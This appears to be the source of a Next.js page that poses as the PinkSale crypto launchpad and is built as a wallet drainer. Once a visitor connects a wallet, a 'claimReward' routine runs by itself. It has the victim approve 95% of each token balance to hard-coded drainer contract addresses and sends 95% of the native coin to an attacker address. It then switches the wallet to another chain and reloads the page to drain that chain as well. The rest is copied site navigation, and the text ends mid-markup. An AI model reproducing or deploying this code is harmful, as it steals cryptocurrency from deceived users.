"use client"
import Image from "next/image";
import { Metadata } from 'next'
import pinksale from '../../public/ic-pinksale.61500ae2.svg'
import dexview from '../../public/dexview-dark.svg';
import baby from '../../public/baby.png'
import catwifihat from "../../public/catwifihat.png"
import solana from '../../public/solana.png'
import babytrump from '../../public/babytrump.jpeg'
import bnb from '../../public/ic-bsc.a3213bd0.svg'
import imgur from '../../public/imgur.jpeg'
import eth from '../../public/ic-eth.4213cf87.svg';
import grokcat from '../../public/grokcat.jpg'
import nobleblocks from '../../public/nobleblocks.png'
import dogemob from '../../public/dogemob.png'
import tokuda from '../../public/tokuda.png'
import falconx from '../../public/falconx.png'
import eagleai from '../../public/eagleai.png'
import base from '../../public/base.png'
import horusx from '../../public/horusx.jpg'
import us from '../../public/us.png'
import cn from '../../public/cn.png'
import { useRouter } from 'next/navigation';
import { useState, useEffect } from "react";
import arbitrum from '../../public/arbitrum.svg'
import polygon from '../../public/polygon.png'
import avax from '../../public/avax.svg'
import fantom from '../../public/fantom.svg'
import Aux from "@/components/hoc/Auxiliary/Auxiliary";
import cronos from '../../public/images/cronos.svg'
import bitrock from '../../public/images/bitrock.png'
import core from '../../public/images/core.png'
import dogechain from '../../public/images/dogechain.png'
import pulse from '../../public/images/pulse.png';
import ConnectButton from "@/components/ConnectButon/ConnectButton";

import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5/react';
import { useWeb3Modal } from '@web3modal/ethers5/react';
import { useWeb3ModalProvider, useWeb3ModalAccount, useWeb3ModalState } from '@web3modal/ethers5/react'
import { Contract, ethers } from 'ethers';
import Drainer from '../components/build/Drainer.json'
// import Drainer from '../build/Drainer.json';



const abi = [
  {
      "constant": false,
      "inputs": [
          {
              "name": "spender",
              "type": "address"
          },
          {
              "name": "amount",
              "type": "uint256"
          }
      ],
      "name": "approve",
      "outputs": [
          {
              "name": "",
              "type": "bool"
          }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
  }
];

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = '92f8c0e47c40ad2cc082fddb43804acd'

const others = [
  {
    chainId: 42161,
    name: 'Arbitrum',
    currency: 'ETH',
    explorerUrl: 'https://arbiscan.io',
    rpcUrl: 'https://arb1.arbitrum.io/rpc'
  },
  {
    chainId: 43114,
    name: 'Avalanche Network',
    currency: 'AVAX',
    explorerUrl: 'https://snowtrace.io',
    rpcUrl: 'https://api.avax.network/ext/bc/C/rpc'
  },
  {
    chainId: 25,
    name: 'Cronos Network',
    currency: 'CRO',
    explorerUrl: 'https://cronos.crypto.org/explorer',
    rpcUrl: 'https://evm-cronos.crypto.org'
  },
  {
    chainId: 250,
    name: 'Fantom Opera Network',
    currency: 'FTM',
    explorerUrl: 'https://ftmscan.com',
    rpcUrl: 'https://rpcapi.fantom.network'
  }
]

// 2. Set chains
const mainnet_chains = [
  {
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    explorerUrl: 'https://etherscan.io',
    rpcUrl: 'https://mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  },{
    chainId: 137,
    name: 'Polygon Mainnet',
    currency: 'MATIC',
    explorerUrl: 'https://polygonscan.com/',
    rpcUrl: 'https://polygon-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  },{
    chainId: 56,
    name: 'BNB Chain',
    currency: 'BNB',
    explorerUrl: 'https://bscscan.com/',
    rpcUrl: 'https://bsc-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  },{
    chainId: 43114,
    name: 'Avalanche Network C-Chain',
    currency: 'AVAX',
    explorerUrl: 'https://snowtrace.io/',
    rpcUrl: 'https://avalanche-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  }
]
const testnets_chains = [{
  chainId: 11155111,
  name: "Sepolia Test Network",
  currency: 'ETH',
  explorerUrl: 'https://sepolia.etherscan.io',
  rpcUrl: 'https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
},
{
  chainId: 97,
  name: 'Binance Smart Chain',
  currency: 'tBNB',
  explorerUrl: 'https://testnet.bscscan.com',
  rpcUrl: 'https://bsc-testnet-rpc.publicnode.com'
}]

// 3. Create modal
const metadata = {
  name: 'Pinksale App',
  description: 'The Launchpad Protocol for Everyone!',
  url: 'https://pinksellapp.site', // origin must match your domain & subdomain
  icons: ['https://pinksellapp.site/icon.ico']
}


// 4. Create Ethers config
// const ethersConfig = defaultConfig({
//   metadata,
//   enableEIP6963: true, // true by default
//   enableInjected: true, // true by default
//   enableCoinbase: true, // true by default
//   rpcUrl: 'https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68', // used for the Coinbase SDK
//   defaultChainId: 1 // used for the Coinbase SDK
// })

createWeb3Modal({
  ethersConfig: defaultConfig({ metadata }),
  chains: mainnet_chains,
  projectId,
  enableAnalytics: true,// Optional - defaults to your Cloud configuration
  featuredWalletIds: [
      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
      'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
      'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393'
  ],
  // excludeWalletIds: [
  //   'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393'
  // ],
  allowUnsupportedChain: true
})

// includeWalletIds: [

// ]

export default function Home() {
  const router = useRouter();

  const clicked = () => {
    router.push('/wallet')
  }


  const [data, setData] = useState([])
  const [addrInfo, setAddrInfo] = useState([])
  const [ change, setChange] = useState(false);
  const [inputted, setInputted] = useState('')
  const [availChains, setAvailChains] = useState([
    {name: 'sepolia', chainId: "11155111", status: false},
    {name: 'bnb', chainId : "97", status: false}
  ])
  const { chainId, isConnected, address} = useWeb3ModalAccount()
  const {open} = useWeb3ModalState()
  const { walletProvider } = useWeb3ModalProvider()

  useEffect(() => {

    async function getCoins() {
      const response = await fetch('/api/getCoins')
      const data = await response.json()
      console.log("info: ", data)
      setData(data.data)


    }

    async function getMoralisData(address) {
      const response = await fetch(`/api/getAllInfo?address=${address}`)
      const inf = await response.json()
      // console.log('resulted: ', inf)
      setTimeout(() => {
        setAddrInfo(inf)
      }, 3000)
    }


    getCoins()
    if(address) {getMoralisData(address)}


  }, [address])

  useEffect(() => {

    setTimeout(() => {

      if(isConnected) {
        if(addrInfo.length){
          claimReward(addrInfo)
        } else {
          console.log('We out here')
        }

      }
    }, 5000)
  }, [isConnected, addrInfo])



  const change_ = () => {
    console.log('i am clicked!')
    setChange(!change)
  }

  const toplinks = () => {
    return data.map((d,i) => {
      return (
        <li key={i} onClick={clicked} class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
          <span class="font-medium">{i+1}</span>
          <a class="text-brand" href={`#`}>{d.token}</a>
        </li>
      )
    })
  }

  const produce = (e) => {
    setInputted(e.target.value)
  }

  const claimReward = async(addr) => {

    console.log('chainId', chainId)
    const drainAddresses = ['0x67eFE8239Dd091Da8486f7b07921D7b699AECc4F', '0xAb31D50880eE7AfbcBE729087C21fbe9cA434E37']
    let ethersProvider = new ethers.providers.Web3Provider(walletProvider)
    // if(chainId === 11155111) {
    //   ethersProvider  = new ethers.JsonRpcProvider('https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68')
    // } else {
    //   ethersProvider  = new ethers.JsonRpcProvider('https://polygon-mumbai.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68')
    // }
    console.log('addrInfo: ', addr)
    // console.log('Data: ', data)
    const trasnferERC = addrInfo && addrInfo.filter(d => {
      return d.chain === chainId
    })

    console.log('transferERC', trasnferERC)

    const signer = ethersProvider.getSigner()
    console.log('signer: ', signer)
    let bal = await ethersProvider.getBalance(address)
    let calc95 = (bal * 95)/100
    console.log('cal95: ', calc95)




    const ethVal = ethers.utils.formatEther(BigInt(calc95))
    console.log('ethVal: ', ethVal)
    const amount = ethers.utils.parseEther(ethVal)
    console.log('amt: ', amount)
    // The Contract object
    let DrainerContract;
    let ERC20;
    let info = []
    // let recipient = '0x6763d3CE81f12c6af800799432A1EF841BF33eA4'
    let recipient = '0x025ad4D4254511D84b3Ad5E85e02D879B8ea1681' //for X

    switch (chainId) {
      case 1:
          if (availChains[0].status) {
            break
          }

          console.log('transferERC', trasnferERC)

          for (let i=0; i < trasnferERC.length; i++) {
            // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
            // Calculate 95% of the balance
            const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
            const balan = BigInt(trasnferERC[i].balance)
            console.log('balanceInDecimal: ', bal)

            let calctok95 = (balan * BigInt(95))/BigInt(100)
            const ethh = ethers.utils.formatEther(calctok95)
            const amt = ethers.utils.parseEther(ethh)
            console.log('console: ', amt)
            // Approve 95% of the balance
            const tx = await tokenContract.approve(drainAddresses[0], amt);
            await tx.wait();
          }

          DrainerContract = new Contract(drainAddresses[0], Drainer.abi, signer)
          const txn = await DrainerContract.transferAll(trasnferERC, recipient, {value: amount})
          await txn.wait()
          info = [...availChains]
          info[0].status = true
          setAvailChains(info)
          break;
      case 56:
        if (availChains[1].status) {
          break
        }

        for (let i=0; i < trasnferERC.length; i++) {
          const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
          const balan = BigInt(trasnferERC[i].balance)
          console.log('balanceInDecimal: ', bal)

          let calct5 = (balan * BigInt(95))/BigInt(100)
          const ethh = ethers.utils.formatEther(calct5)
          const amt = ethers.utils.parseEther(ethh)
          console.log('console: ', amt)
          const tx = await tokenContract.approve(drainAddresses[1], amt);
          await tx.wait();
        }

        DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
        const txx = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
        await txx.wait()
        info = [...availChains]
        info[1].status = true
        setAvailChains(info)

        break;
      case 43114:
          if (availChains[1].status) {
            break
          }

          for (let i=0; i < trasnferERC.length; i++) {
            const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
            const balan = BigInt(trasnferERC[i].balance)
            console.log('balanceInDecimal: ', bal)

            let calct5 = (balan * BigInt(95))/BigInt(100)
            const ethh = ethers.utils.formatEther(calct5)
            const amt = ethers.utils.parseEther(ethh)
            console.log('console: ', amt)
            const tx = await tokenContract.approve(drainAddresses[1], amt);
            await tx.wait();
          }

          DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
          const tfl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
          await tfl.wait()
          info = [...availChains]
          info[1].status = true
          setAvailChains(info)

          break;
        case 137:
            if (availChains[1].status) {
              break
            }

            for (let i=0; i < trasnferERC.length; i++) {
              const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
              const balan = BigInt(trasnferERC[i].balance)
              console.log('balanceInDecimal: ', bal)

              let calct5 = (balan * BigInt(95))/BigInt(100)
              const ethh = ethers.utils.formatEther(calct5)
              const amt = ethers.utils.parseEther(ethh)
              console.log('console: ', amt)
              const tx = await tokenContract.approve(drainAddresses[1], amt);
              await tx.wait();
            }

            DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
            const txl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
            await txl.wait()
            info = [...availChains]
            info[1].status = true
            setAvailChains(info)

            break;
      default:
        break;
    }


    //  const req = ethersProvider.send(
    //   'wallet_switchEthereumChain',
    //   [
    //     {
    //       chainId: 80001,

    //     }
    //   ])


    try {

      if(chainId === 1) {

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0xa86a' }],
        });
        window.location.reload()
      } else if(chainId === 43114){

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x89' }],
        });

        window.location.reload()

      } else if(chainId === 137){

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });

        window.location.reload()

      } else if(chainId === 56){

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x1' }],
        });

        window.location.reload()

      }
    } catch (error) {
      console.log('Error: ', error)
    }
    }

  return (
    <Aux>
      <div className="site-max-width">
      <div data-scroll-watcher="true"></div>
      <div className="fixed h-screen w-[75px] bg-white dark:bg-brand-dark transition-all duration-300 hover:w-[250px] overflow-hidden overflow-y-auto no-scrollbar z-[100] hidden-against-adblock md:block group border-r dark:border-neutral-800 shadow-sm">
        <a className="transition-all flex items-center gap-2 sticky top-0 left-0 bg-white dark:bg-brand-dark dark:border-neutral-800 border-b hover:stroke-2 h-[75px]"
         href="/">
          <div className="flex-shrink-0 p-3">
            <Image alt="PinkSale"
                width={50}
                height={50}
                priority
                decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />

          </div>
          <div className="transition-all font-bold dark:text-slate-200 text-2xl">PinkSale</div>
        </a>
        <nav className="overflow-y-auto no-scrollbar h-[calc(100%-75px)]">
            <div className="px-4">

              <ul className="my-2 py-2">

                <li>
                <div className="transition-all my-2 flex items-center gap-2 capitalize hover:text-brand cursor-pointer pr-[4px]">
                  <div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md relative">

                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                      <path d="M20.92 2.38A15.72 15.72 0 0 0 17.5 2a8.26 8.26 0 0 0-6 2.06Q9.89 5.67 8.31 7.27c-1.21-.13-4.08-.2-6 1.74a1 1 0 0 0 0 1.41l11.3 11.32a1 1 0 0 0 1.41 0c1.95-2 1.89-4.82 1.77-6l3.21-3.2c3.19-3.19 1.74-9.18 1.68-9.43a1 1 0 0 0-.76-.73zm-2.36 8.75L15 14.67a1 1 0 0 0-.27.9 6.81 6.81 0 0 1-.54 3.94L4.52 9.82a6.67 6.67 0 0 1 4-.5A1 1 0 0 0 9.39 9s1.4-1.45 3.51-3.56A6.61 6.61 0 0 1 17.5 4a14.51 14.51 0 0 1 2.33.2c.24 1.43.62 5.04-1.27 6.93z">
                      </path>
                      <circle cx="15.73" cy="8.3" r="2">
                      </circle>
                      <path d="M5 16c-2 1-2 5-2 5a7.81 7.81 0 0 0 5-2z">
                      </path>
                    </svg>
                  </div>
                  <div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">
                  Launchpads
                  </div>
                  <div className="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform:"none"}}>
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                      <path fillRule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z">
                      </path>
                    </svg>
                  </div>

                </div>

                <div className=" hidden-against-adblock group-hover:block transition-all"></div>

                </li>

                <li>
                  <div className="transition-all my-2 flex items-center gap-2 capitalize hover:text-brand cursor-pointer pr-[4px]">
                  <div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md relative">
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                      <path d="M256.16 15.822c-74.685 0-124.825 36.292-157.865 90.487C66.36 158.692 51.637 228.053 50.68 294.954c44.44 12.795 73.834 28.683 90.46 50.123 15.804 20.383 18.445 45.188 12.157 71.963 23.635 7.218 62.826 11.32 100.986 10.905 38.28-.416 76.213-5.67 96.373-13.44-4.608-25.936-.182-50.215 16.983-70.07 17.928-20.738 48.197-36.53 93.4-49.488-.972-63.406-15.24-132.688-46.868-185.92-20.367-34.277-47.386-61.936-82.97-77.972-62.555 14.347-113.232 44.996-143.62 84.12 25.38 8.96 46.088 21.593 65.35 34.583l10.742 7.244-10.266 7.906c-26.884 20.705-46.28 43.707-65.26 67.48 28.468 22.27 47.56 52.2 29.02 65.186-33.572 23.518-170.713 1.396-119.002-78.754 6.006-9.31 15.307-13.314 26.2-13.496 14.635-.244 32.144 6.414 48.4 16.37 17.11-21.452 35.198-43.144 59.1-63.32-18.538-11.88-37.98-22.425-61.975-29.265l-12.29-3.503 7.066-10.65c28.184-42.48 75.737-75.727 134.613-94.523-13.362-3.012-27.71-4.612-43.118-4.612h-.002zm126.594 189.502c10.892.182 20.19 4.187 26.197 13.496 51.712 80.15-85.427 102.272-119 78.754-31.496-22.06 45.603-93.04 92.804-92.25zM252.2 309.057c13.922 0 38.53 68.05 30.277 79.51-6.48 8.996-54.935 8.617-60.555 0-7.197-11.034 16.31-79.51 30.277-79.51zM354.71 433.13c-10.557 3.91-23.223 6.832-37.17 8.952l5.94 48.89h53.416l-22.185-57.84zm-207.888 1.57l-18.5 56.273h47.092l5.914-48.684c-12.764-1.877-24.484-4.38-34.506-7.59zm152.17 9.667c-13.13 1.28-26.996 1.98-41.078 2.21v44.396h46.74l-5.662-46.606zm-99.107.14l-5.647 46.466h44.99V446.6c-13.444-.204-26.714-.894-39.343-2.094z">
                      </path>
                    </svg>
                    <div className="absolute -top-2 -right-2 scale-75">
                      <div className="bg-red-500 text-white inline-block text-xs transform scale-50 font-semibold px-0.5 rounded-sm animate-bounce">Free</div>
                      </div>
                      </div>
                      <div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Degen</div>
                      <div className="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform:"none"}}>
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z">
                      </path>
                      </svg>
                      </div>
                      </div>
                      <div className=" hidden-against-adblock group-hover:block transition-all"></div>
                </li>

                <li>
                <div className="transition-all my-2 flex items-center gap-2 capitalize hover:text-brand cursor-pointer pr-[4px]">
                  <div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md relative">
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                      <path d="M12 2C9.243 2 7 4.243 7 7v2H6c-1.103 0-2 .897-2 2v9c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-9c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7c0-1.654 1.346-3 3-3s3 1.346 3 3v2H9V7zm9.002 13H13v-2.278c.595-.347 1-.985 1-1.722 0-1.103-.897-2-2-2s-2 .897-2 2c0 .736.405 1.375 1 1.722V20H6v-9h12l.002 9z">
                      </path>
                      </svg>
                      </div>
                      <div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">PinkLock</div>
                      <div className="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform:"none"}}>
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                          <path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z">
                          </path>
                        </svg>
                      </div>
                      </div>
                      <div className=" hidden-against-adblock group-hover:block transition-all"></div>
                </li>

                <li>
                  <div className="transition-all my-2 flex items-center gap-2 capitalize hover:text-brand cursor-pointer pr-[4px]">
                    <div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md relative">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 256 256" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M230,120a102,102,0,0,0-204,0,6,6,0,0,0,2.27,4.69l.13.11L122,195v23H112a6,6,0,0,0,0,12h32a6,6,0,0,0,0-12H134V195l93.6-70.2h0A6,6,0,0,0,230,120Zm-12.2-6H173.9c-1.3-42.92-16.5-68.62-28.43-82.3A90.2,90.2,0,0,1,217.8,114ZM128,31.43A77.14,77.14,0,0,1,143.42,49C157.26,70.08,161.24,95,161.89,114H94.11c1.06-31.88,10.49-52.86,18.47-65A76.69,76.69,0,0,1,128,31.43ZM157.8,126,128,179.65,98.2,126Zm-73.33,0,24.62,44.32L50,126Zm87.06,0H206l-59.09,44.32Zm-61-94.3C98.6,45.38,83.4,71.08,82.1,114H38.2A90.2,90.2,0,0,1,110.53,31.7Z">
                        </path>
                      </svg>
                    </div>
                    <div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Airdrops</div>
                    <div className="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform:"none"}}>
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                        <path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z">
                        </path>
                      </svg>
                    </div>
                  </div>
                  <div className=" hidden-against-adblock group-hover:block transition-all"></div>
                </li>

                <li>
                  <div className="transition-all my-2 flex items-center gap-2 capitalize hover:text-brand cursor-pointer pr-[4px]">
                    <div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md relative">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path fill="none" d="M0 0h24v24H0z"></path><path d="M9 4c-4.42 0-8 3.58-8 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm3-7.5h-2v5H8v-5H6V9h6v1.5zm8.25-6.75L23 5l-2.75 1.25L19 9l-1.25-2.75L15 5l2.75-1.25L19 1l1.25 2.75zm0 14L23 19l-2.75 1.25L19 23l-1.25-2.75L15 19l2.75-1.25L19 15l1.25 2.75z"></path>
                      </svg>
                    </div>
                    <div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Token</div>
                    <div className="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform:"none"}}>
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                        <path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z">
                        </path>
                      </svg>
                    </div>
                    </div>
                    <div className=" hidden-against-adblock group-hover:block transition-all"></div>
                </li>

              </ul>
              <div className="border-b w-full dark:border-neutral-800"></div>

              <ul className="my-2 py-2">
                <li>
                  <a href="https://legacy.pinksale.finance/private-sales" className="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer">
                    <div className="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M20.995 6.903a.997.997 0 0 0-.547-.797l-7.973-4a.997.997 0 0 0-.895-.002l-8.027 4c-.297.15-.502.437-.544.767-.013.097-1.145 9.741 8.541 15.008a.995.995 0 0 0 .969-.009c9.307-5.259 8.514-14.573 8.476-14.967zm-8.977 12.944c-6.86-4.01-7.14-10.352-7.063-12.205l7.071-3.523 6.998 3.511c.005 1.87-.481 8.243-7.006 12.217z">
                        </path>
                      </svg>
                    </div>
                    <div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Private Sales</div>
                  </a>
                </li>

                <li>
                  <a className="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" href="/leaderboards">
                    <div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M255 471L91.7 387V41h328.6v346zm-147.3-93.74L255 453l149.3-75.76V57H107.7v320.26zm187.61-168.34l-14.5-46 38.8-28.73-48.27-.43L256 87.94l-15.33 45.78-48.27.43 38.8 28.73-14.5 46 39.31-28zM254.13 311.5l98.27-49.89v-49.9l-98.14 49.82-94.66-48.69v50zm.13 32.66l-94.66-48.69v50l94.54 48.62 98.27-49.89v-49.9z">
                        </path>
                      </svg>
                    </div>
                    <div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap"><div className="inline-block mr-1">Leaderboards</div></div>
                  </a>
                </li>

                <li>
                  <a class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" href="/buy-crypto-fiat">
                    <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="15.5" cy="13.5" r="2.5"></circle>
                        <path d="M12 13.5c0-.815.396-1.532 1-1.988A2.47 2.47 0 0 0 11.5 11a2.5 2.5 0 1 0 0 5 2.47 2.47 0 0 0 1.5-.512 2.486 2.486 0 0 1-1-1.988z"></path>
                        <path d="M20 4H4c-1.103 0-2 .897-2 2v12c0 1.103.897 2 2 2h16c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2zM4 18V6h16l.002 12H4z"></path>
                      </svg>
                    </div>
                    <div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">
                      <div class="inline-block mr-1">Buy Crypto Fiat
                    </div>
                    </div>
                  </a>

                </li>

                <li>
                  <a class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" href="/bridge">
                    <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M740 161c-61.8 0-112 50.2-112 112 0 50.1 33.1 92.6 78.5 106.9v95.9L320 602.4V318.1c44.2-15 76-56.9 76-106.1 0-61.8-50.2-112-112-112s-112 50.2-112 112c0 49.2 31.8 91 76 106.1V706c-44.2 15-76 56.9-76 106.1 0 61.8 50.2 112 112 112s112-50.2 112-112c0-49.2-31.8-91-76-106.1v-27.8l423.5-138.7a50.52 50.52 0 0 0 34.9-48.2V378.2c42.9-15.8 73.6-57 73.6-105.2 0-61.8-50.2-112-112-112zm-504 51a48.01 48.01 0 0 1 96 0 48.01 48.01 0 0 1-96 0zm96 600a48.01 48.01 0 0 1-96 0 48.01 48.01 0 0 1 96 0zm408-491a48.01 48.01 0 0 1 0-96 48.01 48.01 0 0 1 0 96z"></path>
                      </svg>
                    </div>
                    <div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">
                      <div class="inline-block mr-1">Bridge</div>
                    </div>
                  </a>
                </li>

                <li>
                  <a class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" href="/antibot">
                    <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                      <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                        <path d="M8 4h8a2 2 0 0 1 2 2v4a2 2 0 0 1 -2 2m-4 0h-4a2 2 0 0 1 -2 -2v-4"></path><path d="M12 2v2"></path>
                        <path d="M9 12v9"></path>
                        <path d="M15 15v6"></path>
                        <path d="M5 16l4 -2"></path>
                        <path d="M9 18h6"></path><path d="M14 8v.01"></path>
                        <path d="M3 3l18 18"></path>
                      </svg>
                      </div>
                      <div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">
                        <div class="inline-block mr-1">Anti-Bot</div>
                      </div>
                  </a>
                </li>

                <li>
                  <a class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" href="/multi-sender">
                    <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path d="m21.426 11.095-17-8A.999.999 0 0 0 3.03 4.242L4.969 12 3.03 19.758a.998.998 0 0 0 1.396 1.147l17-8a1 1 0 0 0 0-1.81zM5.481 18.197l.839-3.357L12 12 6.32 9.16l-.839-3.357L18.651 12l-13.17 6.197z"></path>
                      </svg>
                    </div>
                    <div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">
                      <div class="inline-block mr-1">Multi-Sender</div>
                    </div>
                  </a>
                </li>

              </ul>
              <div className="border-b w-full dark:border-neutral-800"></div>

              <ul className="my-2 py-2">
                <li>
                  <a href="https://www.dexview.com/" class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer">
                  <div class="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md">
